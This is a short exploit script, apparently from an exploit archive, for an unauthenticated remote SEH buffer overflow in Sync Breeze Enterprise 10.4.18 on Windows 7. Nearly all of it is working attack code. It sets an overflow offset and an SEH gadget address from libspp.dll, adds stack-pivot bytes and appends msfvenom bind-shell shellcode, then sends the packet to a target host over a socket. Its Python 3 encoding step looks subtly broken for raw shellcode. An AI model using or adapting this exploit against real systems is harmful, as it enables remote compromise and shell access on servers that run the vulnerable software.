# Exploit Title: Sync Breeze Enterprise v10.4.18 Server - Unauthenticated Remote Buffer Overflow SEH
# Date: 29/01/2018
# Exploit Author: Daniel Teixeira
# Vendor Homepage: http://www.syncbreeze.com
# Software Link: http://www.syncbreeze.com/setups/syncbreezeent_setup_v10.4.18.exe
# Version: 10.4.18 
# Tested on: Windows 7 x86


import sys
import socket
import time
import socket
from payload import buf
from struct import pack
import struct
def shell_attack(target_machine, target_port):

    port = target_port
    host = target_machine

    # msfvenom -a x86 --platform windows -p windows/shell_bind_tcp -f py -b '\x00\x02\x0a\x0d\xf8\xfd' --var-name shellcode 
    

    payload =  "A" * 124            # offset
    payload += "\x90\x09\xeb\x05"   # jmp over seh retrun value
    payload += "\x1b\x5c\x01\x10"   # 0x10015c1b : pop edi # pop esi # ret 0x04 | ascii {PAGE_EXECUTE_READ} [libspp.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Program Files\Sync Breeze Enterprise\bin\libspp.dll)

    payload += "\x90" * 10
    payload += "\x83\xc4\x64" * 20  # metasm > add esp,100
    payload += "\xff\xe4"           # metasm > jmp esp
    payload += "\x90" * (1000 - len(payload) - len(buf))
    payload += str(buf)

    header =  "\x75\x19\xba\xab"
    header += "\x03\x00\x00\x00"
    header += "\x00\x40\x00\x00"
    header += str(pack('<I', len(payload)))
    header += str(pack('<I', len(payload)))
    header += str(pack('<I', ord(payload[-1])))
    packet = header
    packet += payload 

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        packet = bytes(packet, 'utf-8')
        s.connect((host, port))
        s.send(packet)

    except:

        print("Connection Failed")
        

    

    